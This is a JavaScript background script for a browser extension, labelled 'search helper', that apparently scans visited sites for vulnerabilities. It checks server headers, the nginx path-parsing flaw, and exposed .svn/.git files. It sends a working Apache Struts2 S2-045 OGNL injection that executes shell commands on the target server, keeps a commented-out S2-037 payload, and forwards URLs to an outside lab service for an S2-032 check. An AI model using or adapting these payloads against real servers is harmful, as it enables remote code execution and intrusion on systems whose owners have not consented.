var struts_cmd="echo struts2,check,ajax,js";
// var struts2_poc={
// 	"037":"(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command="+cmd
// };
function parseUrl(url){
	var a=document.createElement("a");
	a.href=url;
	return {
		protocol:a.protocol,
		host:a.host
	};
}
try{
function ajax(data){
	if(typeof data!="object")return;
	var xhr;
	var method=(data.type||data.method)||"GET";
	method=method.toUpperCase();
	try{
		xhr=new XMLHttpRequest();
	}catch(e){
		xhr=new ActiveXObject('Microsoft.XMLHTTP');
	}
	xhr.open(method,data.url||"",data.sync||true);
	if(data.header)for(var attr in data.header){
		xhr.setRequestHeader(attr, data.header[attr]);
	}
	if(method=='POST'){
		if(!data.header || (data.header && !data.header["Content-type"])){
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		}
	}
	data.data?xhr.send(data.data):xhr.send();
	xhr.onreadystatechange = function(){
		if(xhr.readyState == 4){
			if(xhr.status == 200){
				typeof data.success=="function"&&data.success(xhr.responseText,xhr);
			} else {
				typeof data.error=="function"&&data.error(xhr);
			}
		}
	}
}
chrome.extension.onConnect.addListener(function(port) {
	port.onMessage.addListener(function(data) {
		console.assert(data.name=="search helper");
		(function(){
			//check http code and server info
			var server="";
			ajax({
				url:data.url,
				type:"get",
				success:function(_,res){
					try{
						var tmp=[];
						res.getAllResponseHeaders().split("\r\n").forEach(function(val){
							tmp=val.split(": ");
							tmp[0].toUpperCase()=="SERVER"&&(server=tmp[1]);
						});
					}catch(e){}
					port.postMessage({code:200,num:data.num,resource:data.url,type:'httpcode',server:server.replace("<","").replace("\\","")});
				},
				error:function(res){
					try{
						var tmp=[];
						res.getAllResponseHeaders().split("\r\n").forEach(function(val){
							tmp=val.split(": ");
							tmp[0].toUpperCase()=="SERVER"&&(server=tmp[1]);
						});
					}catch(e){}
					port.postMessage({code:res.status,num:data.num,resource:data.url,type:'httpcode',server:server.replace("<","").replace("\\","")});
				}
			});
		})();
		(function(){
			//check nginx parse
			var nurl=parseUrl(data.url);
			var err=["No input file specified","Parse error","syntax error","T_STRING"];
			var parse_flag=false;
			nurl=nurl.protocol+"//"+nurl.host+"/robots.txt/1.php";
			ajax({
				url:nurl,
				type:"get",
				success:function(_){
					err.forEach(function(val){
						if(_.indexOf(val)>-1){
							parse_flag=true;
						}
					});
					if(parse_flag){
						port.postMessage({num:data.num,resource:nurl,type:'nginxParse',status:1});
					}
				},
				error:function(res){
					try{
						err.forEach(function(val){
							if(res.responseText.indexOf(val)>-1){
								parse_flag=true;
							}
						});
						if(parse_flag){
							port.postMessage({num:data.num,resource:nurl,type:'nginxParse',status:1});
						}
					}catch(e){}
				}
			});
		})();
		//check  svn git webstore 
		//check url is file?
		if(!/\.\w+$/.test(data.url)){
			var r=parseUrl(data.url);
			var u=r.protocol+"//"+r.host+"/";
			var u1=data.url.split("?")[0];
			var t=[".svn/entries",".git/config"];
			var urls=[];
			if(!/\/$/.test(data.url)){
				u1+="/";
			}
			t.forEach(function(val){
				urls.push(u+val);
				urls.push(u1+val);
			});
			urls.forEach(function(url,index){
				ajax({
					url:url,
					type:"get",
					success:function(_,res){
						//exists
						if(_.indexOf("<body>")<0)
						port.postMessage({code:200,num:data.num,resource:url,type:'leakage',leakage_type:index%2==0?'svn':'git',status:1});
					}
				});
			});
		}
		//check redis
		
		//check mysql
		
		//check struts2 045   http://www.shopmoroso.com/eb/welcome.action
		ajax({
			url:data.url,
			header:{
				"Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+struts_cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
			},
			type:"post",
			success:function(_,res){
				var mz=struts_cmd.split(" ");
				if(_.indexOf(struts_cmd)<0 && _.indexOf(mz[1])>-1){
					port.postMessage({num:data.num,resource:data.url,st_num:'045',type:'struts2',content:_,status:1});
				}else{
					port.postMessage({num:data.num,resource:data.url,st_num:'045',type:'struts2',status:0});
				}
			},
			error:function(){
				port.postMessage({num:data.num,resource:data.url,st_num:'045',type:'struts2',status:0});
			}
		});
		//check struts2 032
		ajax({
			url:"https://www.vulbox.com/lab/?type=4&host="+data.url,
			type:"get",
			success:function(_,res){
				if(_.indexOf("alert-warning")>-1 && _.indexOf("无法连接")<0){
					port.postMessage({num:data.num,resource:data.url,st_num:'032',type:'struts2',content:_,status:1});
				}else{
					port.postMessage({num:data.num,resource:data.url,st_num:'032',type:'struts2',status:0});
				}
			},
			error:function(){
				port.postMessage({num:data.num,resource:data.url,st_num:'032',type:'struts2',status:0});
			}
		});
	});
});
}catch(e){alert(e)}